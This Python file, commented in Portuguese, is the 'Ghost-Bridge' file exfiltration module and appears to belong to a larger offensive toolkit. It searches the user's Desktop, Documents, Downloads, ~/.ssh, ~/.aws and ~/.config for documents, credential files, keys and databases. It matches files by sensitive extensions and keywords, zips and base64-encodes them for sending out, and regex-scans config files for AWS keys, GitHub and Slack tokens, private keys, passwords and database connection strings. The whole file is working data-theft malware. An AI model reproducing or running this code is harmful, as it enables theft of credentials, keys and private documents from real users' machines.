"""
Ghost-Bridge - File Exfiltration Module
Busca e exfiltra arquivos sensíveis.
"""
import os
import base64
import hashlib
import zipfile
import io
from datetime import datetime
from pathlib import Path


class FileExfiltrator:
    """
    Busca e exfiltra arquivos específicos.
    
    Features:
    - Busca por extensões sensíveis
    - Busca por palavras-chave no nome
    - Compressão antes de exfiltrar
    - Hash para verificação
    - Limite de tamanho configurável
    """
    
    # Extensões sensíveis por categoria
    SENSITIVE_EXTENSIONS = {
        'documents': ['.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.rtf'],
        'credentials': ['.kdbx', '.key', '.pem', '.ppk', '.p12', '.pfx', '.ovpn', '.rdp'],
        'code': ['.py', '.js', '.php', '.sql', '.env', '.config', '.json', '.xml', '.yaml', '.yml'],
        'archives': ['.zip', '.rar', '.7z', '.tar', '.gz'],
        'data': ['.csv', '.db', '.sqlite', '.mdb', '.accdb', '.bak'],
    }
    
    # Palavras-chave sensíveis
    SENSITIVE_KEYWORDS = [
        'password', 'senha', 'secret', 'credential', 'private', 'confidential',
        'backup', 'database', 'dump', 'export', 'financial', 'bank', 'credit',
        'vpn', 'ssh', 'key', 'token', 'api', 'config', 'settings'
    ]
    
    # Diretórios interessantes
    INTERESTING_PATHS = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Documents'),
        os.path.expanduser('~/Downloads'),
        os.path.expanduser('~/.ssh'),
        os.path.expanduser('~/.aws'),
        os.path.expanduser('~/.config'),
        os.environ.get('TEMP', ''),
    ]
    
    def __init__(self, max_file_size_mb=10, max_total_size_mb=50):
        """
        Args:
            max_file_size_mb: Tamanho máximo por arquivo (MB)
            max_total_size_mb: Tamanho total máximo (MB)
        """
        self.max_file_size = max_file_size_mb * 1024 * 1024
        self.max_total_size = max_total_size_mb * 1024 * 1024
        self.collected_size = 0
    
    def _get_file_hash(self, filepath):
        """Calcula hash MD5 do arquivo."""
        try:
            hasher = hashlib.md5()
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    hasher.update(chunk)
            return hasher.hexdigest()
        except:
            return None
    
    def _file_matches_criteria(self, filepath, extensions=None, keywords=None):
        """Verifica se arquivo corresponde aos critérios."""
        path = Path(filepath)
        name_lower = path.name.lower()
        
        # Por extensão
        if extensions:
            if path.suffix.lower() not in extensions:
                return False
        
        # Por palavra-chave
        if keywords:
            if not any(kw in name_lower for kw in keywords):
                return False
        
        return True
    
    def search_files(self, paths=None, extensions=None, keywords=None, max_results=100):
        """
        Busca arquivos sensíveis.
        
        Args:
            paths: Lista de diretórios para buscar
            extensions: Lista de extensões para filtrar
            keywords: Lista de palavras-chave para filtrar
            max_results: Máximo de resultados
            
        Returns:
            Lista de arquivos encontrados
        """
        if paths is None:
            paths = self.INTERESTING_PATHS
        
        if extensions is None:
            extensions = []
            for exts in self.SENSITIVE_EXTENSIONS.values():
                extensions.extend(exts)
        
        results = []
        
        for base_path in paths:
            if not base_path or not os.path.exists(base_path):
                continue
            
            try:
                for root, dirs, files in os.walk(base_path):
                    # Ignora diretórios do sistema
                    dirs[:] = [d for d in dirs if not d.startswith('.') 
                               and d not in ['node_modules', '__pycache__', 'venv']]
                    
                    for filename in files:
                        filepath = os.path.join(root, filename)
                        
                        try:
                            # Verifica critérios
                            if not self._file_matches_criteria(filepath, extensions, keywords):
                                continue
                            
                            stat = os.stat(filepath)
                            size = stat.st_size
                            
                            # Verifica tamanho
                            if size > self.max_file_size:
                                continue
                            
                            results.append({
                                'path': filepath,
                                'name': filename,
                                'size': size,
                                'size_kb': round(size / 1024, 2),
                                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                'extension': Path(filename).suffix.lower()
                            })
                            
                            if len(results) >= max_results:
                                return results
                                
                        except (PermissionError, OSError):
                            continue
                            
            except Exception as e:
                continue
        
        return results
    
    def read_file(self, filepath, as_base64=True):
        """
        Lê conteúdo de um arquivo.
        
        Args:
            filepath: Caminho do arquivo
            as_base64: Se True, retorna em base64
            
        Returns:
            Dict com metadados e conteúdo
        """
        try:
            stat = os.stat(filepath)
            
            if stat.st_size > self.max_file_size:
                return {'error': f'Arquivo muito grande: {stat.st_size} bytes'}
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            result = {
                'path': filepath,
                'name': os.path.basename(filepath),
                'size': len(content),
                'hash': hashlib.md5(content).hexdigest(),
                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
            }
            
            if as_base64:
                result['content_base64'] = base64.b64encode(content).decode('utf-8')
            else:
                try:
                    result['content_text'] = content.decode('utf-8')
                except:
                    result['content_base64'] = base64.b64encode(content).decode('utf-8')
            
            return result
            
        except Exception as e:
            return {'error': str(e), 'path': filepath}
    
    def create_zip(self, filepaths, password=None):
        """
        Cria ZIP com múltiplos arquivos.
        
        Args:
            filepaths: Lista de caminhos
            password: Senha para o ZIP (opcional)
            
        Returns:
            ZIP em base64
        """
        buffer = io.BytesIO()
        
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for filepath in filepaths:
                try:
                    if os.path.exists(filepath):
                        arcname = os.path.basename(filepath)
                        zf.write(filepath, arcname)
                except:
                    continue
        
        zip_content = buffer.getvalue()
        
        return {
            'format': 'zip',
            'size': len(zip_content),
            'size_kb': round(len(zip_content) / 1024, 2),
            'file_count': len(filepaths),
            'content_base64': base64.b64encode(zip_content).decode('utf-8')
        }
    
    def exfiltrate_documents(self, max_files=20):
        """
        Exfiltra documentos encontrados.
        
        Returns:
            ZIP com documentos em base64
        """
        # Busca documentos
        docs = self.search_files(
            extensions=self.SENSITIVE_EXTENSIONS['documents'],
            max_results=max_files
        )
        
        if not docs:
            return {'error': 'Nenhum documento encontrado'}
        
        # Cria ZIP
        filepaths = [d['path'] for d in docs]
        zip_data = self.create_zip(filepaths)
        zip_data['files_included'] = [d['name'] for d in docs]
        
        return zip_data
    
    def exfiltrate_credentials(self):
        """
        Busca e exfiltra arquivos de credenciais.
        """
        cred_files = self.search_files(
            extensions=self.SENSITIVE_EXTENSIONS['credentials'],
            max_results=50
        )
        
        # Adiciona busca por palavra-chave
        keyword_files = self.search_files(
            keywords=self.SENSITIVE_KEYWORDS,
            extensions=['.txt', '.conf', '.ini', '.json', '.env'],
            max_results=30
        )
        
        all_files = cred_files + keyword_files
        
        # Remove duplicatas
        seen = set()
        unique = []
        for f in all_files:
            if f['path'] not in seen:
                seen.add(f['path'])
                unique.append(f)
        
        if not unique:
            return {'error': 'Nenhum arquivo de credencial encontrado'}
        
        filepaths = [f['path'] for f in unique]
        zip_data = self.create_zip(filepaths)
        zip_data['files_included'] = [f['name'] for f in unique]
        
        return zip_data
    
    def search_for_secrets(self, directory):
        """
        Busca segredos dentro de arquivos de configuração.
        
        Args:
            directory: Diretório para buscar
            
        Returns:
            Lista de segredos encontrados
        """
        import re
        
        patterns = {
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret': r'(?i)aws[_-]?secret[_-]?access[_-]?key["\s:=]+([A-Za-z0-9/+=]{40})',
            'github_token': r'gh[pousr]_[A-Za-z0-9_]{36,}',
            'slack_token': r'xox[baprs]-[0-9a-zA-Z-]+',
            'google_api': r'AIza[0-9A-Za-z_-]{35}',
            'private_key': r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
            'password_field': r'(?i)password["\s:=]+["\']?(.{8,50})["\']?',
            'connection_string': r'(?i)(mongodb|mysql|postgres|redis)://[^\s"\']+',
        }
        
        secrets = []
        
        config_extensions = ['.env', '.conf', '.ini', '.json', '.yaml', '.yml', 
                           '.cfg', '.config', '.properties', '.xml']
        
        files = self.search_files(
            paths=[directory],
            extensions=config_extensions,
            max_results=100
        )
        
        for file_info in files:
            try:
                with open(file_info['path'], 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                for secret_type, pattern in patterns.items():
                    matches = re.findall(pattern, content)
                    for match in matches[:5]:  # Limita por tipo
                        secrets.append({
                            'file': file_info['path'],
                            'type': secret_type,
                            'match': match if isinstance(match, str) else match[0],
                        })
                        
            except:
                continue
        
        return secrets


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste do File Exfiltrator")
    
    exfil = FileExfiltrator(max_file_size_mb=5)
    
    print("\n[+] Buscando documentos...")
    docs = exfil.search_files(
        paths=[os.path.expanduser('~/Documents')],
        extensions=['.pdf', '.docx', '.xlsx'],
        max_results=5
    )
    
    for doc in docs:
        print(f"    {doc['name']} ({doc['size_kb']} KB)")
    
    print("\n[+] Buscando arquivos de credenciais...")
    creds = exfil.search_files(
        extensions=['.pem', '.key', '.env'],
        max_results=5
    )
    
    for cred in creds:
        print(f"    {cred['path']}")
